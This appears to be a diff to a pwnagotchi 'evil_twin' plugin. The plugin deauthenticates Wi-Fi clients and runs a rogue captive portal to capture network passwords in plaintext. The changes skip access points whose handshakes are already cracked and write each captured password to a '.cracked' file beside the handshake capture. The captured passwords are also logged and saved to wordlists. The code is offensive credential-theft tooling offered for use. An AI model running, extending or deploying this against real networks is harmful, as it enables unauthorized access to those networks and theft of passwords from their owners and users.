@@ -163,6 +163,19 @@ def _iface_exists(name):
     return os.path.exists(f"/sys/class/net/{name}")
 
 
+def _already_cracked(pcap_path):
+    """Return True if we already have a cracked password for this handshake.
+
+    Checks for .cracked (written by pwnagotchi's aircrackng plugin and by
+    community_quickdic) and .key (written by pwncrack / wpa-sec tools).
+    If either exists, the password is already known — no evil twin needed.
+    """
+    return (
+        os.path.exists(pcap_path + ".cracked")
+        or os.path.exists(pcap_path + ".key")
+    )
+
+
 # ─── Session (one evil twin run) ─────────────────────────────────────────────
 
 class _Session:
@@ -369,6 +382,11 @@ class EvilTwin(plugins.Plugin):
         ssid = access_point.get("hostname", "")
         if not ssid:
             return
+        if _already_cracked(filename):
+            logging.info(
+                "[evil_twin] '%s' already cracked — skipping evil twin", ssid
+            )
+            return
         try:
             self._q.put_nowait((ssid, filename))
             logging.info("[evil_twin] queued evil twin for '%s'", ssid)
@@ -395,7 +413,7 @@ class EvilTwin(plugins.Plugin):
                 portal_port=int(self.options.get("portal_port", 8080)),
                 deauth_rounds=int(self.options.get("deauth_rounds", 3)),
                 deauth_interval=int(self.options.get("deauth_interval", 15)),
-                on_captured=self._captured,
+                on_captured=lambda s, pw: self._captured(s, pw, pcap),
             )
             try:
                 self._session.run()
@@ -404,8 +422,16 @@ class EvilTwin(plugins.Plugin):
             finally:
                 self._session = None
 
-    def _captured(self, ssid, password):
+    def _captured(self, ssid, password, pcap=None):
         logging.info("[evil_twin] plaintext captured for '%s': %s", ssid, password)
+        # Write .cracked alongside the handshake so future runs (and
+        # community_quickdic) know this AP's password is already known.
+        if pcap:
+            try:
+                with open(pcap + ".cracked", "w") as f:
+                    f.write(password + "\n")
+            except Exception as e:
+                logging.warning("[evil_twin] could not write .cracked file: %s", e)
         folder = self.options.get("wordlist_folder", "/home/pi/wordlists/")
         try:
             os.makedirs(folder, exist_ok=True)
